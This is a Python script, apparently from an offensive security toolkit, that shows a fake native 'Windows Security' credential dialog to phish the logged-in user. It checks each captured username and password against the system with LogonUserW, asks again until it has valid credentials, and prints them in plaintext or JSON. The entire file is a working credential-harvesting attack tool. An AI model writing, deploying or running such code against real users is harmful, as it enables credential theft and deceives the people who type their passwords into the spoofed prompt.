#!/usr/bin/env python3
"""
credential_prompt.py - Spawn a fake Windows credential dialog to phish the current user.

Uses CredUIPromptForCredentialsW from credui.dll to display a native-looking
Windows Security dialog. Captured credentials are verified against the local
system via LogonUserW from advapi32.dll.

Requires: Administrator privileges on Windows.

Part of CyberStrike offensive security platform.
"""

import argparse
import ctypes
import ctypes.wintypes
import json
import os
import signal
import sys
import time
from datetime import datetime


# --- CREDUI constants ---

CREDUI_MAX_USERNAME_LENGTH = 513
CREDUI_MAX_PASSWORD_LENGTH = 256
CREDUI_MAX_DOMAIN_TARGET_LENGTH = 337

# CREDUI_FLAGS
CREDUI_FLAGS_GENERIC_CREDENTIALS = 0x00040000
CREDUI_FLAGS_ALWAYS_SHOW_UI = 0x00000080
CREDUI_FLAGS_DO_NOT_PERSIST = 0x00000002

# LogonUser logon types
LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

# CredUIPromptForCredentials return codes
NO_ERROR = 0
ERROR_CANCELLED = 1223


class CREDUI_INFO(ctypes.Structure):
    _fields_ = [
        ("cbSize", ctypes.wintypes.DWORD),
        ("hwndParent", ctypes.wintypes.HWND),
        ("pszMessageText", ctypes.wintypes.LPCWSTR),
        ("pszCaptionText", ctypes.wintypes.LPCWSTR),
        ("hbmBanner", ctypes.wintypes.HBITMAP),
    ]


class CredentialPrompt:
    """Displays a fake Windows credential dialog and captures user input."""

    def __init__(self, message=None, title=None, json_output=False):
        self.message = message or "Windows Security requires your credentials to continue."
        self.title = title or "Windows Security"
        self.json_output = json_output
        self.running = True
        self.start_time = None
        self.credui = None
        self.advapi32 = None
        self.kernel32 = None
        self.captured = []

    def check_admin(self):
        """Verify the script is running with Administrator privileges."""
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        except AttributeError:
            is_admin = False
        if not is_admin:
            print(
                "ERROR: credential_prompt.py requires Administrator privileges.",
                file=sys.stderr,
            )
            sys.exit(1)

    def print_banner(self):
        print("=" * 70)
        print("  credential_prompt.py - Credential Phishing Dialog (Windows)")
        print("=" * 70)
        print(f"  PID:         {os.getpid()}")
        print(f"  Title:       {self.title}")
        print(f"  Message:     {self.message}")
        print(f"  JSON output: {self.json_output}")
        print("=" * 70)
        print()

    def signal_handler(self, signum, frame):
        self.running = False

    def _load_libraries(self):
        """Load Windows DLLs for credential prompting and verification."""
        self.credui = ctypes.windll.credui
        self.advapi32 = ctypes.windll.advapi32
        self.kernel32 = ctypes.windll.kernel32

    def _log(self, message, level="info", **extra):
        if self.json_output:
            payload = {"level": level, "message": message, "timestamp": time.time()}
            payload.update(extra)
            print(json.dumps(payload), flush=True)
        else:
            print(f"[credential_prompt] {message}", flush=True)

    def _verify_credentials(self, username, password, domain):
        """Verify captured credentials via LogonUserW."""
        token_handle = ctypes.wintypes.HANDLE()

        result = self.advapi32.LogonUserW(
            username,
            domain if domain else None,
            password,
            LOGON32_LOGON_INTERACTIVE,
            LOGON32_PROVIDER_DEFAULT,
            ctypes.byref(token_handle),
        )

        if result:
            self.kernel32.CloseHandle(token_handle)
            return True
        return False

    def _parse_domain_username(self, full_username):
        """Split DOMAIN\\username or username@domain into components."""
        domain = ""
        username = full_username

        if "\\" in full_username:
            parts = full_username.split("\\", 1)
            domain = parts[0]
            username = parts[1]
        elif "@" in full_username:
            parts = full_username.split("@", 1)
            username = parts[0]
            domain = parts[1]

        return domain, username

    def _prompt_once(self):
        """Display the credential dialog once and return captured credentials."""
        cred_info = CREDUI_INFO()
        cred_info.cbSize = ctypes.sizeof(CREDUI_INFO)
        cred_info.hwndParent = None
        cred_info.pszMessageText = self.message
        cred_info.pszCaptionText = self.title
        cred_info.hbmBanner = None

        username_buf = ctypes.create_unicode_buffer(CREDUI_MAX_USERNAME_LENGTH)
        password_buf = ctypes.create_unicode_buffer(CREDUI_MAX_PASSWORD_LENGTH)
        save_checked = ctypes.wintypes.BOOL(False)

        flags = (
            CREDUI_FLAGS_GENERIC_CREDENTIALS
            | CREDUI_FLAGS_ALWAYS_SHOW_UI
            | CREDUI_FLAGS_DO_NOT_PERSIST
        )

        result = self.credui.CredUIPromptForCredentialsW(
            ctypes.byref(cred_info),
            self.title,               # pszTargetName
            None,                      # pContext (reserved)
            0,                         # dwAuthError
            username_buf,
            CREDUI_MAX_USERNAME_LENGTH,
            password_buf,
            CREDUI_MAX_PASSWORD_LENGTH,
            ctypes.byref(save_checked),
            flags,
        )

        if result == ERROR_CANCELLED:
            self._log("User cancelled the credential dialog.", level="info")
            return None

        if result != NO_ERROR:
            self._log(f"CredUIPromptForCredentialsW returned error {result}", level="error")
            return None

        raw_username = username_buf.value
        password = password_buf.value
        domain, username = self._parse_domain_username(raw_username)

        return {
            "raw_username": raw_username,
            "username": username,
            "password": password,
            "domain": domain,
        }

    def _emit_result(self, record):
        """Output a single captured credential result."""
        timestamp = datetime.now().isoformat()
        if self.json_output:
            output = {
                "level": "credential",
                "timestamp": timestamp,
                "username": record["username"],
                "password": record["password"],
                "domain": record["domain"],
                "verified": record.get("verified", False),
            }
            print(json.dumps(output), flush=True)
        else:
            verified_str = "VALID" if record.get("verified") else "UNVERIFIED"
            print(
                f"[{timestamp}] "
                f"USER={record['username']:<30} "
                f"DOMAIN={record['domain']:<20} "
                f"PASS={record['password']:<30} "
                f"STATUS={verified_str}",
                flush=True,
            )

    def run(self):
        """Main loop: prompt for credentials until valid ones are captured or user cancels."""
        self.check_admin()
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self._load_libraries()
        self.start_time = time.monotonic()

        self._log("Displaying credential prompt dialog...")

        while self.running:
            creds = self._prompt_once()

            if creds is None:
                self._log("No credentials captured (dialog cancelled).")
                break

            # Verify the captured credentials
            verified = self._verify_credentials(
                creds["username"],
                creds["password"],
                creds["domain"],
            )
            creds["verified"] = verified
            self.captured.append(creds)
            self._emit_result(creds)

            if verified:
                self._log(
                    f"Valid credentials captured for user: {creds['username']}",
                    level="info",
                )
                break

            self._log(
                "Credentials failed verification. Re-prompting...",
                level="info",
            )

        self.cleanup()

    def cleanup(self):
        """Print summary and exit."""
        print(f"\n--- credential_prompt summary ---")
        print(f"Captured {len(self.captured)} credential attempt(s)")
        valid_count = sum(1 for c in self.captured if c.get("verified"))
        print(f"Valid credentials: {valid_count}")
        if self.start_time:
            elapsed = time.monotonic() - self.start_time
            print(f"Duration: {elapsed:.1f}s")
        print("Cleanup complete. Exiting.")


def main():
    parser = argparse.ArgumentParser(
        description="Spawn a fake Windows credential dialog to capture user credentials.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 credential_prompt.py\n"
            "  python3 credential_prompt.py --title 'Network Access' --message 'Enter domain credentials'\n"
            "  python3 credential_prompt.py --json-output\n"
        ),
    )
    parser.add_argument(
        "--message",
        type=str,
        default="Windows Security requires your credentials to continue.",
        help="Message text displayed in the credential dialog.",
    )
    parser.add_argument(
        "--title",
        type=str,
        default="Windows Security",
        help="Title/caption of the credential dialog.",
    )
    parser.add_argument(
        "--json-output",
        action="store_true",
        default=False,
        help="Output captured credentials as JSON lines for structured consumption.",
    )
    args = parser.parse_args()

    prompter = CredentialPrompt(
        message=args.message,
        title=args.title,
        json_output=args.json_output,
    )
    prompter.run()


if __name__ == "__main__":
    main()
